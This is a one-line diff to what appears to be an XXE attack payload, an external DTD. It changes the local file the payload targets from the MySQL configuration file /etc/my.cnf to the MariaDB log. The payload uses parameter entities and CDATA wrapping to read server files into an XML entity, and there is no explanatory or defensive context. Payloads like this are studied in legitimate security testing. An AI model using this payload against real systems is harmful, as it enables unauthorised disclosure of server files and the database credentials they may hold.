@@ -1,1 +1,1 @@
-<!ENTITY % file SYSTEM "file:///etc/my.cnf"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
+<!ENTITY % file SYSTEM "file:///var/log/mariadb/mariadb.log"><!ENTITY % start "<![CDATA["><!ENTITY % end "]]>"><!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
